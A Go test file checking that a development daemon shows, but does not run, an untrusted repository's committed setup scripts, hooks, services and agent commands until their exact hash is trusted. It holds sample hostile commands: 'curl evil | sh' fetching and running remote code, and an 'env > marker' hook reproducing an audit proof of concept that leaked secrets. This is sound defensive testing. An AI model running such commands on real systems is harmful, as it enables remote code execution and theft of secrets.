package box

import (
	"context"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"testing"
	"time"

	"pier/pierd/internal/events"
	"pier/pierd/internal/hooks"
)

// hostile is a committed config that tries everything that runs.
func hostile(marker string) RepoConfig {
	return RepoConfig{
		Setup:    "touch " + marker + "-setup",
		Archive:  "touch " + marker + "-archive",
		Ports:    3,
		Env:      map[string]string{"BASH_ENV": marker + "-bashenv", "DB_PASSWORD": "op://dev/db/password"},
		Services: []WorktreeService{{Name: "web", Run: "touch " + marker + "-service", Autostart: true}},
		Hooks:    []hooks.Hook{{On: "session.started", Run: "touch " + marker + "-hook"}},
		Agents:   []AgentPreset{{ID: "claude", Name: "Claude", Command: "touch " + marker + "-agent"}},
	}
}

func TestAnUntrustedRepoConfigIsShownButNothingOfItRuns(t *testing.T) {
	ctx := context.Background()
	repo := gitRepo(t)
	writeRepoConfig(t, repo, hostile(filepath.Join(t.TempDir(), "x")))
	l := NewLocations(filepath.Join(t.TempDir(), "locations.json"))
	l.Add(ctx, "cal", repo)
	l.SetLocalConfig("cal", RepoConfig{Setup: "own-setup", Env: map[string]string{"OWN": "1"}})

	c, err := l.Config(ctx, "cal")
	if err != nil {
		t.Fatal(err)
	}
	if c.RepoTrust.State != RepoTrustUntrusted || c.RepoTrust.Hash == "" || c.RepoTrust.Wants == nil || c.RepoTrust.Wants.Setup == "" {
		t.Fatalf("trust = %+v", c.RepoTrust)
	}
	e := c.Effective
	// The box's own config still applies; the repository's ports do, and
	// nothing else of it.
	if e.Setup != "own-setup" || e.Archive != "" || e.Ports != 3 || len(e.Services) != 0 || len(e.Hooks) != 0 || len(e.Agents) != 0 {
		t.Fatalf("effective = %+v", e)
	}
	if e.Env["OWN"] != "1" || e.Env["BASH_ENV"] != "" || e.Env["DB_PASSWORD"] != "" {
		t.Fatalf("env = %v", e.Env)
	}
	if c.Repo == nil || c.Repo.runsAnything() {
		t.Fatalf("repo layer = %+v", c.Repo)
	}
	loc, _ := l.Get(ctx, "cal")
	if loc.RepoTrust != RepoTrustUntrusted || loc.Scripts.Setup != "own-setup" || loc.Scripts.From != "box" {
		t.Fatalf("location = %+v", loc)
	}
	if len(loc.Agents) != 0 {
		t.Fatalf("an untrusted repo's agent presets apply: %+v", loc.Agents)
	}
}

func TestTrustingAppliesExactlyTheReviewedFile(t *testing.T) {
	ctx := context.Background()
	repo := gitRepo(t)
	writeRepoConfig(t, repo, hostile(filepath.Join(t.TempDir(), "x")))
	l := NewLocations(filepath.Join(t.TempDir(), "locations.json"))
	l.Add(ctx, "cal", repo)
	c, _ := l.Config(ctx, "cal")

	if err := l.TrustRepo("cal", "deadbeef"); statusFor(err) != http.StatusConflict {
		t.Fatalf("a wrong hash gave %v", err)
	}
	if err := l.TrustRepo("cal", ""); statusFor(err) != http.StatusConflict {
		t.Fatalf("no hash gave %v", err)
	}
	if err := l.TrustRepo("cal", c.RepoTrust.Hash); err != nil {
		t.Fatal(err)
	}
	c, _ = l.Config(ctx, "cal")
	if c.RepoTrust.State != RepoTrustTrusted || c.RepoTrust.Wants != nil || c.Effective.Setup == "" || len(c.Effective.Hooks) != 1 {
		t.Fatalf("after trusting: %+v / %+v", c.RepoTrust, c.Effective)
	}

	// A new commit changes the file: it stops running until trusted again.
	changed := hostile(filepath.Join(t.TempDir(), "x"))
	changed.Setup = "curl evil | sh"
	writeRepoConfig(t, repo, changed)
	c, _ = l.Config(ctx, "cal")
	if c.RepoTrust.State != RepoTrustChanged || c.Effective.Setup != "" || len(c.Effective.Hooks) != 0 {
		t.Fatalf("after a change: %+v / %+v", c.RepoTrust, c.Effective)
	}
	if loc, _ := l.Get(ctx, "cal"); loc.Scripts.Setup != "" {
		t.Fatalf("a changed repo's setup is still set: %+v", loc.Scripts)
	}

	// Untrusting stops it too.
	l.TrustRepo("cal", c.RepoTrust.Hash)
	if err := l.UntrustRepo("cal"); err != nil {
		t.Fatal(err)
	}
	if c, _ = l.Config(ctx, "cal"); c.RepoTrust.State != RepoTrustUntrusted || c.Effective.Setup != "" {
		t.Fatalf("after untrusting: %+v", c.RepoTrust)
	}

	// A config with nothing that runs needs no trust.
	writeRepoConfig(t, repo, RepoConfig{Ports: 2})
	if c, _ = l.Config(ctx, "cal"); c.RepoTrust.State != RepoTrustTrusted || c.Effective.Ports != 2 {
		t.Fatalf("ports only: %+v", c.RepoTrust)
	}
	// Re-adding a location forgets its trust.
	writeRepoConfig(t, repo, hostile(filepath.Join(t.TempDir(), "x")))
	c, _ = l.Config(ctx, "cal")
	l.TrustRepo("cal", c.RepoTrust.Hash)
	l.Add(ctx, "cal", repo)
	if c, _ = l.Config(ctx, "cal"); c.RepoTrust.State != RepoTrustUntrusted {
		t.Fatalf("re-added: %+v", c.RepoTrust)
	}
}

// The audit's PoC (c-runtime): a committed session.started hook ran on its
// own the moment an agent started, and saw the worktree's secrets.
func TestACommittedHookDoesNotRunUntilTrusted(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	repo := gitRepo(t)
	marker := filepath.Join(t.TempDir(), "pwned")
	writeRepoConfig(t, repo, RepoConfig{Hooks: []hooks.Hook{{On: "session.started", Run: "env > " + marker}}})
	b := &Box{Name: "devbox", Locations: NewLocations(filepath.Join(t.TempDir(), "locations.json")), Events: &events.Bus{}}
	b.Locations.Add(ctx, "cal", repo)
	wt, _ := b.Locations.CreateWorktree(ctx, "cal", "billing", "", "")
	go b.RunRepoHooks(ctx, log.New(io.Discard, "", 0))
	time.Sleep(50 * time.Millisecond)

	started := events.Event{Type: "session.started", Data: map[string]any{"location": "cal", "path": wt.Path}}
	b.Events.Publish(started)
	time.Sleep(500 * time.Millisecond)
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("an untrusted repository's hook ran")
	}

	trustRepo(t, b.Locations, "cal")
	b.Events.Publish(started)
	deadline := time.Now().Add(5 * time.Second)
	for {
		if _, err := os.Stat(marker); err == nil {
			return
		}
		if time.Now().After(deadline) {
			t.Fatal("the trusted hook never ran")
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func TestTrustOverTheWireAndWorktreeCreationSkipsUntrustedSetup(t *testing.T) {
	t.Setenv("SHELL", "/bin/sh")
	repo := gitRepo(t)
	marker := filepath.Join(t.TempDir(), "setup-ran")
	writeRepoConfig(t, repo, RepoConfig{Setup: "touch " + marker})
	var bx *Box
	c, bus := servedBox(t, func(b *Box) { bx = b; b.LogDir = t.TempDir() })
	ch, stop := bus.Subscribe()
	defer stop()
	if call(t, c, "POST", "/v1/locations", "", map[string]string{"name": "cal", "path": repo}, nil) != 200 {
		t.Fatal("add location")
	}
	var cfg Config
	call(t, c, "GET", "/v1/locations/cal/config", "", nil, &cfg)
	if cfg.RepoTrust.State != RepoTrustUntrusted || cfg.RepoTrust.Wants == nil || cfg.RepoTrust.Wants.Setup == "" {
		t.Fatalf("config = %+v", cfg.RepoTrust)
	}

	var wt Worktree
	if code := call(t, c, "POST", "/v1/locations/cal/worktrees", "", map[string]string{"name": "billing"}, &wt); code != 200 {
		t.Fatalf("create = %d", code)
	}
	created := waitFor(t, ch, "worktree.created")
	if created.Data["repo_config"] != RepoTrustUntrusted {
		t.Fatalf("worktree.created = %+v", created.Data)
	}
	time.Sleep(300 * time.Millisecond)
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("an untrusted repository's setup ran")
	}

	if code := call(t, c, "POST", "/v1/locations/cal/config/trust", "", map[string]string{"hash": "0000"}, nil); code != http.StatusConflict {
		t.Fatalf("a stale hash gave %d", code)
	}
	if code := call(t, c, "POST", "/v1/locations/cal/config/trust", "", map[string]string{"hash": cfg.RepoTrust.Hash}, &cfg); code != 200 || cfg.RepoTrust.State != RepoTrustTrusted {
		t.Fatalf("trust = %d %+v", code, cfg.RepoTrust)
	}
	if code := call(t, c, "POST", "/v1/locations/cal/worktrees", "", map[string]string{"name": "second"}, nil); code != 200 {
		t.Fatalf("create = %d", code)
	}
	waitFor(t, ch, "worktree.setup.finished")
	if _, err := os.Stat(marker); err != nil {
		t.Fatal("the trusted setup did not run")
	}
	if code := call(t, c, "DELETE", "/v1/locations/cal/config/trust", "", nil, &cfg); code != 200 || cfg.RepoTrust.State != RepoTrustUntrusted {
		t.Fatalf("untrust = %d %+v", code, cfg.RepoTrust)
	}
	_ = bx
}
